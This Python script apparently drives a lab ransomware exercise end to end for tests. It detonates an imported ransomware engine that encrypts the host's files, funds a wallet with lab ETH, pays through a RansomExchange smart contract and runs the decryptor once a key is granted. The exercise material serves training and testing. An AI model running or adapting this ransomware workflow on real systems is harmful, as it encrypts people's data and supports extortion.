"""Headless victim: the full pay-and-recover flow, scripted, for tests.

    yom-ransomware headless --password lab

Runs exactly the participant UI's steps, without prompts:
detonate (if not yet) -> wallet -> buy lab ETH -> option 5 (register + pay +
await the attacker's on-chain reply + key grant) -> decryptor.
Prints a JSON summary last and exits 0 only when every file came back with a
valid AES-GCM tag.
"""

import argparse
import json
import sys
import time

from software.core import ready
from software.ransomware.runtime.engine import RECOVERED, Ransomware
from software.ransomware.runtime.ui.menu import payment_client, run_recovery_step


def step(text):
    print(f"\n== {text}", flush=True)


def run(password: str, timeout: int = 900, rw: Ransomware = None, client=None) -> dict:
    rw = rw or Ransomware()
    client = client if client is not None else payment_client(rw)
    if client is None:
        raise SystemExit("headless mode needs a payment client (no payment attached)")
    started = time.monotonic()

    step("detonate")
    if rw.keylog_path.exists():
        print("already encrypted on this host")
    else:
        record = rw.detonate()
        print(f"encrypted {len(record['files'])} files")

    step("wait for the chain")
    cfg = client.cfg
    ready.wait_rpc(cfg["rpc_url"], cfg["chain_id"], timeout=timeout)
    contract = ready.wait(lambda: client.contract_status()["code_bytes"] > 0,
                          "RansomExchange deployment", timeout=timeout)
    print(f"contract alive: {contract}")

    step("wallet")
    if not client.wallet_exists():
        client.create_wallet(password)
    address = client.wallet_address()
    print(f"wallet {address}")

    step("buy lab ETH")
    if not client.is_paid() and client.balance(address) < client.price_wei:
        amount = min(client.fund_max, client.price_wei // 10**18 + 1)
        client.buy(amount, address)
        ready.wait(lambda: client.balance(address) >= client.price_wei,
                   "faucet funds", timeout=300)
    print(f"balance {client.format_ether(client.balance(address))} lab ETH")

    step("document recovery (option 5)")
    file_key = run_recovery_step(rw, client, password=password, wait_timeout=timeout)
    if file_key is None:
        raise SystemExit("recovery step ended without a key grant")

    step("decryptor")
    restored = rw.recover(file_key)
    summary = {
        "host": rw.participant_id,
        "state": rw.state(),
        "restored": restored,
        "request_id": client.request_id(),
        "seconds": round(time.monotonic() - started, 1),
        "ok": rw.state() == RECOVERED and restored > 0,
    }
    rw.emit("headless_done", **summary)
    return summary


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--password", default="lab-headless")
    parser.add_argument("--timeout", type=int, default=900)
    args = parser.parse_args(argv)
    summary = run(args.password, args.timeout)
    print(json.dumps(summary, sort_keys=True))
    return 0 if summary["ok"] else 1


if __name__ == "__main__":
    sys.exit(main())
